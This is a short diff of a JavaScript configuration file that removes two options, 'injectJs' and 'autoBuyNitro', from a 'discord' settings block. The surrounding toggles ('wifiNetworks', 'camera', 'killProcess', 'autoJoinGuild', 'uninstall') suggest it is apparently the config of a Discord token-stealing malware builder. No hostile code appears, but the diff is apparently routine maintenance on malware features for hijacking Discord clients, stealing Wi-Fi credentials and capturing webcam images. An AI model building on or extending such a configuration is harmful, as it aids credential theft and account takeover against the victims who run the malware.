@@ -16,8 +16,6 @@ module.exports = {
   wifiNetworks: false,
   camera: true,
   discord: {
-    injectJs: false,
-    autoBuyNitro: false,
     uninstall: false,
     killProcess: false,
     autoJoinGuild: false,
